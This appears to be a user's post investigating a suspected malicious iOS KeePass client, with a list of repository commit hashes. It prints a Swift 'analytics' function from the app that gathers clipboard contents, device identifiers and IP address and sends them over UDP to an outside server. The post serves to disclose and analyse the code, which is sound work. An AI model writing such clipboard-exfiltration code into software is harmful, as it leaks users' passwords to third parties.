# Suspicious iOS KeePass client

Early this week somebody was trying to log into my bank account (from a location within Germany). 2FA protected me. This was a surprise, because I am storing my service specific login credentials in KeePass, thus for them to have my pass, they would have to access my personal devices.

Contacted my bank, they came back telling me they do not see any suspicious activity.

Looked through my local machine (first manually, than with 3 different kind of AVs). Nothing.

Changed my bank account password and waited. After a few days, there was a new login attempt. Panicked.

Started to go over my iPhone, checking everything, trying to update each application to its latest version. To my surprise the app I was using to read my KeePass database, iOSKeePass, was missing from App Store. It was deleted and I only owned a local copy. I specifically selected this fork, because its source-code was public on GitHub. Went up there and started to read each commit. Found this weird piece of analytics code that is sending the clipboard contents over UDP to a 3rd party server. Yesterday (20th of May) contacted the developer over a GitHub comment shouting out this is weird, because the application uses its clipboard access to copy out passwords from the DB - sending these over analytics sounds like a huge risk. Today (21th of May) this comment was deleted and the repository was washed clean with a single commit in the main branch.

```
func sendAnalytics(_ dbname: String , dbsize: String, modate: String, date: String, action: String) -> String?
{
	//check appSettings
	
	//Analyse String
	//WIFI:COUNTRY:LANGUAGE:TIMEZONE:SYSTEMNAME:SYSTEMVERSION:DEVICEID:APPVESRION:APPCLIPBOARD:DBNAME:DBSIZE:DBDATE:SYSTEMDATETME:ACTION
	let appSettings = AppSettings.sharedInstance() as AppSettings
	if(appSettings.analyseDataEnabled() == false)
	{
		return "Not Enabled"
	}

	var anna = "!AMSG|"
	if(Luminous.Network.isConnectedViaWiFi){
		anna += "WIFI"
	}else{
		anna += "CELL"
	}

	anna += "|"+Luminous.Locale.currentCountry!+"|"+Luminous.Locale.currentLanguage!
	anna += "|"+Luminous.Locale.currentTimeZoneName+"|"+Luminous.Hardware.systemName
	anna += "|"+Luminous.Hardware.systemVersion.stringValue+"|"+Luminous.Hardware.Device.identifierForVendor!
	anna += "|"+Luminous.Application.completeAppVersion
	anna += "|"+(Luminous.Application.clipboardString ?? "empty")
	anna += "|"+dbname
	anna += "|"+dbsize
	anna += "|"+modate
	anna += "|"+date
	anna += "|"+action
	anna += "|"+getIPAddress()!
	print(anna)




	let client = UDPClient(address: "anna.unicomedv.de", port: 10548)
	switch client.send(data: encdata!) {
	  case .success:
		return "UPD send data success"
	  case .failure(let error):
		return "UDP send data error: \(error)"
	}

	return "Failed"

}
```

I wrote a script which saved each commit of the repository as ZIP files. Run a few keyword searches, but did not find anything that would directly sell out my credentials. Expect to this analytics report which includes the clipboard content. If I understand the inner app flow right, this is triggered after opening a DB, so not after opening and copying an entry. However, it still makes me feel insecure.

```
e45695a2a3fa85748c3e5bd28d296120def4e822
65b755493088bbe0f672f7c8c45abf87bcc45bb0
eb62b8a36c78eb1af886af9e8aa96c124bc7cd76
a67d2a7010354b9f9189a89cc554b50d0f479034
df7b7210be5b59d258d1eff99737bc434bc4a187
60381956e297073b7a572c497120d4de75f35605
dc2d21309d48fe025fe2816c8abf3fefec8ccffd
a0a85e63fcc6e9e3d6bc75798471a4b20a82e331
7953c19930512c89504fce86f4b4858d5cef4011
44c2c2ade8158ad311b74832250345c0e7540f0b
c3ac2ba679ed2e579217572c277c93b780af456e
4c40032b0414279d4df92ddbd12873ad8883ced9
ff836c60e28c498998c321744b2358fd15358deb
b9cde7985e89d4be5938506560a1704287862607
3bf20f796d1e882474407aa7b25f45d91fab72fd
466f8043216a6a55315186594c86db50a3343263
ed0a0a55ca65b888a973c18f078a88301dfd0507
12e9de8b61a206cc4766dcc639fd52d1fdc2123e
92526f1665b1ef983d946653c75f597e36953fb9
55465149499ab344c1cb2f1e2c1eb7caaf86de7c
060d2223dbc74e5448baf4e5a1538c41e8b596a3
c4d4be2c5178175824b2dfe0d3910054728730af
cc3d53292f6822e961f3a9581a0378a0e4b291ea
b88e0f5987f5450b2635fb81322d969a86f265f7
2aca6ca7a06b5d4bf0bd5107b0afe9e6695b8b6a
85ad0af65bbdc7661982e616bdd9b194b4e32004
aa9ec9015bc59ecdfc8b48794c86783aae2f9180
7532465759d901a51c371bd21c8256c6b77f0ee6
daa4a0c7477674b5bbed4545ee1d6b3a7745a2a4
437221cce8ce17ca57320ca4045caa96c42caa80 - This is where the "Anna" code is introduced sending the clipboard data.
89e32e676b91cf1ece16ff00efa1e1adc877af6c
1c804306dd0aecea7882b201d9f413b232b38c13
1f04dcd7e7c63b3a8b26de21f5151be89e7ecaad
33800f98244e4e3199f49b14472d0cd11db48d5a
e896e7b6a1bcca972b44de6c5383ea7a484cbf87
687da896be6f36f07f412e23bba30f17afe75165
819d344f73b305291eac5313400278e06424eec4
9c9f8b7d0399803634713aad660fd282c26c50ba
64e4dfa86b893fcefc09c9604ea81c30a0dfc7e4
8f23f59b41a2a949c658b92a351934d5c2bad6f2
8ffc510d05f3ee0f93d0a617a363dfae44bfabfb
9ba749e1dd10d89e63b8c766e6f0d772b04399b6
55a60464380761b07f044d2aa0993afd62aa9662 - This is the last IOSKeePass version. After this it is renamed.
ea6c81a9c517ac9b4b2d7c056fc17dc8f36c6b9b
5b43f547626fc56340109ef2e1b8c22260cbcb6e
89e7b690368cb1de8716794ead3487aacc4b116e
e9505c7ea48129d31dd162033776bfc04c4f1c77
a02b82f37eda31690d0908637a1a826885b4be67
d9e19e95d2ae8cc783a87d0be2d91b4eff93e8c2
70fd0cd804827ebb61f0c5880ea6d1dbc18d2a50
a8d84a45ec1cd17f6dffb739a95f93b1434b8831
7ac7691749769cb3b9c9be1ac1fc6d07c94eca13
6502cf6b1b179302382bbd5d8eb014e29562826e
7c4026cfc89dcc37d3b6bffe30fce3bbf3160367
b332152e1483756da233615ecb5da9c9da837815
e3e18c578e4cf72dc3fcf544fb1f6722b82094aa
5f2ad4b01570da24534b8ef5d6fdb6057a38a58e
73e84e62730ef58ce89ba0db1d8c4c6a78217d3f
51bd5bd7d35f963ad05413817524dad4bcde7f9d
25de0c12552740381911915deb4d0de6b9abb729
ff19fb38bd0f91640b5b811cb2b34dbd0a0a7250
ebe8b8c0b357cb18c95671b953370e91afeebdac
7abcbcd9dbfdcdd8475aebb81753b8af6cacdd34
a2e0b2330059a5ae06d87673181876235a1e4b12
c3593513e4110a401b63c1bc8eaffdde1179f845
ef3b5522d9d4b8d298e689abb362313b036b17b9
ecdf21d6d014c09d20993d4c8bee8538a17533af
a718e1263721314873d2606b04b59abd3044f7d4
4c24dd735c103fc67f328183f65aa1dd00573bbb
d3ea419894c9b23ac5b8c1df8136adb8ea5304fb
d7c06db5e506651ebbef5afeb855a8fe03822221
8d00debf6c1f4a11e4f44d149371212c1f6ba20b
a7980560abbba7c714921fbe65d986cc9f9e7c32
27f4f2d0f7238907e2b50b7df3940fd42158a879
c816f6dc30a11403f5871759555cc8c1b3c73ee2
6a76e5275e0e1d5ef6d656b03911ae9c62807554
441fdedbd28d780c4fffcb6d0d0b89d74a8ca17b
f663155ee3b63d97a4bb4f4eac0fe4397b4e3a39
0c8a8bc6f24651c5fda0812cc7340b92af69a7c6
36c449e1879507b09eb66c94310925643d12c7ef
bb8be52a35b46678bff32bc10f8348aed84caa3a
f3d93900451d0f62c24eac1fd4caf7b371f460f7
9afb86e7e37e4802ff9c109d574ff59998fe313e
ea5bac6fa4fd41139115e963e550802a25c87a74
f6c04b6a482838b82d836a0d1862adc54fbe78f4
933691a9fcb816da78d2ff1251878abee637d8d8
3081a331eeb6c46e0e12f3b3c0cc44d4f5712198
7e1e329e76f11d14b61666355a773bcbbd4c2447
8bc2b8b4c8e6997b9249eab29b92a5bd1db342f1
ef536a932293416ea0192a8e5ab77a5267bb86f5
f5633280df379358a873b8879d2cb5f6b73637a2
43a6826f93369ef497a4be772315c4028af184af
faf48e033fc16ba662a211f9cb53fbeefc35aaf8
683d347d9bfa9e65986df9ba610778e8d24a3b0e
1bf7c8e09f525f4841bb01fa7547500e3a7dc846
b4e0539b767710bf45c15c5f8df3116f3c8fbef6
5f6ee6c7c18257d8124c583ddc86050b4faa95fa
5cbbe76ef533c44f8b54e9e1608aaff0079962ce
370fb1be3213c7c6345cffe5ea4ed523818eddc3
241dae0b01ec3afb45d7f6802d679ee8bcd6355d
ca810aca7008e10fe2c906a00cfc9a73601d7eb2
45b4045f6b4fdf20974f567f26a7f3bca28f4256
93c7ed7bf7168f535f145238c776ccd377dc30f2
e88f0ac1ca9098b60d1dbec72c2f0b373cfbeab5
77b5e6a9c3429ec1a18b8dba6b70b80a5882c99f
83c8a9f30fa6c7f806740e98788e057ec7d6a04b
aeb7fed3011621e997150fea849805cb385452c9
f071bc82a89e782358d09acba1d355f719a9b056
efcf30e45148ce03ba1a2dbe37dfbf16146e7440
7d4031e197c372c38f8bc8388f0e5669e829c658
cafb0d988d71663adf4257afbf58731357afe637
e06458f08d21d7e0eefe6e2ea6d6d5205a8a366a
8684114df15131813ba37f164681a4b917214a07
a91cb32d54aa637ea21bdcf466c3fe8f1f1afc9c
b70d00764f85bd9fd8efea4a592305ff4669614b
e8c7bd96a9bb1bb8e2e2abd0050ecb34a3626387
eb2716c4d3859e107f7bfe8eea565ec298aee69b
cd689e0ee54763580a9aaa4fbe0156f91ea48172
16c3c1aa6e2e60e3cf8ad2756fb093f68928b7a0
587f1f6a50fe8b8ce5a67aa5e8dfa2be4c066136
5547dd21e62910469f967effadeb149600f820cd
ab698bf630eb8d1c20d48353eca4df8cb94d627f
e14d0eb3c7458897131532c6899970714f71d7f2
54040a4658e55e748c349ef6c64767c35289fb88
bcee44ad259fe316a6744c167fff4ed04c85bcd3
29db11787229fd2c9757b5289cba357c614de1d1
a1b1c45c9a6dbd0f22133e25daf359f4e4a2d648
4d962010d84ce3d8568accb7926b62cfd0cee066
c3e942ac9f271fa57b0da950c161b3fe5056a4b3
072132a66fc40f7514c4bedfdb699be5f6a5cf95
85dd760bc055c20005500c12ab1b2bddf4c4501c
e7d013d076b63eb01b67539b9350416a1153729d
839ccc861c3650eb2e4636ab2114095dfe788abe
7daf635a59cd08a37cf756a1076898674049b212
e9c8f95cc5fa7ae0a823a41d1b9e34ce64876c2c
07d0d80fcfc4407d1c7b8e322fdd5a48728ca1d0
4aeac01e3fe0381e335be35763a68e3dd8145af8
7fb73218a4c56fd7d6ca9e1af6871a0d983ef9fb
2f444cd580657aeeb4129932123257358cb98198
c910fe331285505a74dcd11320f04d5a4a1d59b6
590bf2c0442515598cbf58d63737347b7316f68f
721edb6df32cd485771ffd345acf69a3b0065a87
ed64090d042b8b4ff9de78c4a7c84dfdc1188af6
61d9e8083320b2021ae112df04488366be245718
620a98f460aee59478820402a37127fb94922f1b
488661f3c20f4d00dc35158dda8a4e2b740cc440
a707902112517cb3681559d1fe039af5c7c914b3
7527ba5cf6c9a503c3b674f1f106920017776a33
de579aa50fa91719b7cd7304586410c63a449f4c
5465f58718b0608fef49adf9d01f734d00eff154
dbccbcff0add24bbf6d011fa0be0af4315f6ed57
8cb4d08475d79775feb756f138b0513b9907746a
8c0d33a64e27a6406d7887070e2514c5989560c9
595feed80c64bdc883a5b6e53144722804570175
91600d93bb79e79f9e7441812ec8533da96bc068
b12dfd8411977fe403f32410f237bba08a58eedb
797fa557f9bfc8ff98ba24d78a0b038bdc6cc6a3
32f56ca5dbabf2197d6d5c41795ae34966e0f4f9
9c48a54aef953df54ad55a49f8c51c22926b35d2
331c977cd633c8caa8c8c1ac04990dc1543269bf
527686c4abb4f7a94ee534f5010eea5ab13b764d
2d0758d2d004d0d901b1b2f3c1138d6e575d288b
382b9b8b3115a253d49da2f0bb94ba3893c99baa
a013965244c554cce190d4f77a7a43a49918afca
bc4ed0222070fbee6db083e196f947f093e3ee91
64d9956098e3829c6d04610f286e24a02662ca87
c537cd79ea7b6ff539ba5043e7fa40afff10aabb
7c27f118b81b4b6e029bea3039905cdd4c52ce02
31acdf4c4ec6b5bd3ec866180b8e3f35c59e9bbc
ca175eb80e597a73541c1c1095408f5a61b8393b
70b59c3053add56e82c0dd9fb3f02fd24f010fb6
27b3f085ac5e715dbd5432001a9ab15cbda7bc06
8050a0860c0092b2f2a3e09df9f4f0aa17c4ba39
7a22c2037880b218c84fe2bb3577749047c039a6
c82fdfbf26a15ba82cc38d38092bc9a8783ff683
7341ccab1bbd085be1ebe9eefac2273773d61de0
8e01d93e9daa4d759602a74c115dfea60494b6cd
a2d2ba6f776f77f8e4010d9c2e617dcc4f482402
f10e4aecd01ad4673a40fa6499b0d02947e12d3b
2334d969668ebb4566ad3af47eb6452397e351f0
25e37c826d3d789e08b7e400bea74fc75af898f1
89741c81b906facd4462b233ed551f81d3a5b322
de3e8c87e508821538ede6c04ce452adbd28b81c
9cf54011a2e8ba915c771c3082de15d8d57e0bed
efae3fad6c05d75403f22b76004091402c6ddef1
39f44d3f252ecc1a350c26f5b578bdd416003cb2
b4cccfbce6d4b3f555ebc44a0488fac638e59a8b
e8e3d7fd370c67631ee9b58fec7154d9f3763a54
bf6acebf55bffbf91b9f7f20691b82a4c3e60e2c
6e0d8143629a79957bc001f32c10c9618228bf87
07824467ec7ba63d6aebdefa65d681fe53de4d20
9a578151c68c9b24567049ce613a59cd2c7ee39b
9b2dcfe0dc2ff93ba3e7e3b5c5dcb5d2a71987cf
8156500a28df33c7518e0a7cf8267aaf0d1ae9cf
b721e48e04807bc4dea8657f57a48aba810d3709
bcac96ebc7af027445a4379c820bfa5e386a2305
5579309d01147bbff85dce19e36b85a70f71fa57
f9f0661f3d49c0d91b3b4dc218fd9ffcc939d0d8
5ef1434829fb674713a4f8f78cc6b433f3d40894
17d07098a3ec52e702516264f38b01137ecd88e8
8f3f29e9550610f19e0b7ef6b7d6191864ed57ee
e2ab614121d135dd3f31ca8a06272577991a69fe
2c4407fc26873c1d227fa2d2b278c80ede1a0a56
95a5ca061002bbb13c01f38a87924ed81d43744c
```